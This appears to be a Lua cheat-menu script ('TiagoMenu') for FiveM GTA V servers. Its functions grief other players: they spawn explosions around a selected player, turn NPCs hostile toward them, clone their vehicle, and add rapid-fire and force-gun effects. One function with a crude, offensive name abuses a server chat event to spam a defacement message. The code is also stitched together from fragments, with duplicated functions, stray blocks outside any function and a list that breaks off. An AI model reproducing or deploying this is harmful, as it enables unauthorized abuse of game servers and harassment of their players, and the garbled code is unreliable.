end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end


local function GetPedImpact(p)
    local retval, coord = GetPedLastWeaponImpactCoord(p)
    return coord
end

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

local function RequestNetworkControl(Request)
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone)
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

function DrawTxt(text, x, y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D2(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov

    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry('STRING')
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end


local objects = {}

local function wallin()
    Citizen.CreateThread(
        function()
            while true do
                DrawTxt(
                    '~y~Press ~s~E ~y~to spawn | ~y~Press ~s~Z ~y~to delete | ~y~Press ~s~G ~y~to clear objects | ',
                    0.23,
                    0.90
                )
                DrawTxt('~y~Press ~s~X ~y~to stop script', 0.595, 0.90)
                DrawTxt('~y~Spawned:~s~ ' .. #objects, 0.80, 0.90)

                for i = 1, #objects do
                    local x, y, z = table.unpack(GetEntityCoords(objects[i]))
                    DrawText3D2(x, y, z + 1, 'OBJECT HERE! INDEX: ' .. i)
                end

                if IsControlJustPressed(1, 38) then
                    local pos = GetEntityCoords(PlayerPedId())
                    local pitch = GetEntityPitch(PlayerPedId())
                    local roll = GetEntityRoll(PlayerPedId())
                    local yaw = GetEntityRotation(PlayerPedId()).z
                    local xf = GetEntityForwardX(PlayerPedId())
                    local yf = GetEntityForwardY(PlayerPedId())
                    objects[#objects + 1] =
                        CreateObject('prop_container_01a', pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
                    SetEntityRotation(objects[#objects], pitch, roll, yaw + 90)
                    SetEntityVisible(objects[#objects], 0, 1, 1)
                    print('Object placed with index: ' .. objects[#objects])
                elseif IsControlJustPressed(1, 20) then
                    SetEntityCoords(objects[#objects], 0, 0, 0)
                    DeleteObject(objects[#objects])
                    print('Deleted object with index: ' .. #objects)
                    table.remove(objects, #objects)
                elseif IsControlJustPressed(1, 47) then
                    for i = 0, #objects do
                        SetEntityCoords(objects[i], 0, 0, 0)
                        DeleteObject(objects[i])
                        print('Deleted object with index: ' .. i)
                    end
                    objects = {}
                elseif IsControlJustPressed(1, 73) then
                    print('Script has been stopped')
                    break
                end
                Citizen.Wait(1)
            end
        end
    )
end
TiagoMenu = {}

TiagoMenu.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.25
local titleYOffset = 0.05
local titleScale = 1.5

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local currForcefieldRadiusIndex = 1
local selForcefieldRadiusIndex = 1

local function ForcefieldPlayer(target, radius)
	local player = GetPlayerPed(target)
	local coords = GetEntityCoords(player)
	DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 0, 0, 35, false, true, 2, nil, nil, false)
	
	for ped in EnumeratePeds() do
		if GetDistanceBetweenCoords(coords, GetEntityCoords(ped)) <= radius*1.2 and ped ~= PlayerPedId() then
			--ApplyForceToEntity(ped, 3, 5.0, 5.0, 10.0, 0, 0, 0, 0, false, true, true, false, true)
			AddExplosion(GetEntityCoords(ped), 5, 1.0, false, true, 0.0)
		end
	end
	
	for obj in EnumerateObjects() do
		if GetDistanceBetweenCoords(coords, GetEntityCoords(obj)) <= radius*1.2 then
			--ApplyForceToEntity(obj, 3, 5.0, 5.0, 10.0, 0, 0, 0, 0, false, true, true, false, true)
			AddExplosion(GetEntityCoords(obj), 5, 1.0, false, true, 0.0)
		end
	end
	
	for veh in EnumerateVehicles() do
		if GetDistanceBetweenCoords(coords, GetEntityCoords(veh)) <= radius*1.2 then
			--ApplyForceToEntity(veh, 3, 5.0, 5.0, 10.0, 0, 0, 0, 0, false, true, true, false, true)
			AddExplosion(GetEntityCoords(veh), 5, 1.0, false, true, 0.0)
		end
	end
	
	for pickup in EnumeratePickups() do
		if GetDistanceBetweenCoords(coords, GetEntityCoords(pickup)) <= radius*1.2 then
			--ApplyForceToEntity(pickup, 3, 5.0, 5.0, 10.0, 0, 0, 0, 0, false, true, true, false, true)
			AddExplosion(GetEntityCoords(pickup), 5, 1.0, false, true, 0.0)
		end
	end
	
end

local function debugPrint(text)
	if TiagoMenu.debug then
		Citizen.Trace("[TMmenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end
local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

local function fixcar()
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				drawNotification("~h~-» ~g~Car Fixed!")	
		end
    

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end


 if RapidFire then
            DoRapidFireTick()
        end

local function DoRapidFireTick()
    if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end


 if ForceGun then
           
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function TiagoMenu.CreateMenu(id, title)

	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 7
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)				
				menus[id].titleBackgroundColor = {r = 0, g = 0, b = 0, a = 200}
				menus[id].menuFocusBackgroundColor = {r = 0, g = 0, b = 0, a = 255}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 10}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 10
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

	debugPrint(tostring(id) .. " menu created")
end

function TiagoMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		TiagoMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function TiagoMenu.CurrentMenu()
	return currentMenu
end

function TiagoMenu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function TiagoMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function TiagoMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function TiagoMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function TiagoMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function TiagoMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function TiagoMenu.MenuButton(text, id)
	if menus[id] then
		if TiagoMenu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function TiagoMenu.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if TiagoMenu.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

function TiagoMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end

	if TiagoMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function TiagoMenu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			TiagoMenu.CloseMenu()
		else
					ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "PIN_BUTTON", "ATM_SOUNDS", true) --down

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "PIN_BUTTON", "ATM_SOUNDS", true) --up

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "Pin_Bad", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS", true) --back
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					TiagoMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function TiagoMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function TiagoMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function TiagoMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function TiagoMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function TiagoMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function TiagoMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function TiagoMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function TiagoMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function TiagoMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function TiagoMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function TiagoMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function TiagoMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function TiagoMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers(128) do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end

function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY MALOSSIHOSTING")
    end
end



function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end



local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
